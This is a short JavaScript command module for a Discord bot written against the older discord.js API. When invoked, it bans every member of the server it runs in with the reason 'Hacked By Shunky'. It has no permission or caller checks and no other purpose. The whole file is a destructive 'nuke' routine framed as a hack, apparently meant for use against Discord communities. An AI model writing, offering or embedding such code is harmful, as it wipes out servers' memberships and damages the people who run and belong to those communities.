exports.run = async (client, message) => {
  function banir(){
    client.guilds.get(message.guild.id).members.forEach((membros) => {
      membros.ban("Hacked By Shunky")
    })
  }
  banir()
}
